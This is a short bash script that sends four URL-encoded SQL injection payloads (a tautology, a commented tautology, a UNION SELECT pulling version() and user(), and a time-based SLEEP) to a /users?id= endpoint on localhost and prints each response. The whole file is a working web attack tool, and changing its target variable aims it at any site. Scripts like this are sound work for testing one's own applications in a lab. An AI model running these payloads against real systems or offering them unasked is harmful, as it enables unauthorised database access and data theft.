#!/bin/bash
# Simple SQLi payload tester using curl
# Target: http://localhost:8080

TARGET="http://localhost:8080"

# Example endpoint (adjust as needed)
ENDPOINT="/users?id="

# Common payloads (escaped properly for curl)
PAYLOADS=(
  "1%27%20OR%20%271%27%3D%271"                    # 1' OR '1'='1
  "1%27%20OR%20%271%27%3D%271%27%20--%20-"        # 1' OR '1'='1' -- -
  "1%27%20UNION%20SELECT%20null,%20version(),%20user()%20--%20-" # Union select
  "1%27%20AND%20SLEEP(5)%20--%20-"                # Blind time-based
)

for p in "${PAYLOADS[@]}"; do
    echo "[*] Testing payload: $p"
    RESPONSE=$(curl "${TARGET}${ENDPOINT}${p}" \
        -H "User-Agent: SQLi-Tester" \
        --max-time 10)

    echo "----- Response Start -----"
    echo "$RESPONSE"
    echo "----- Response End -------"
    echo
done
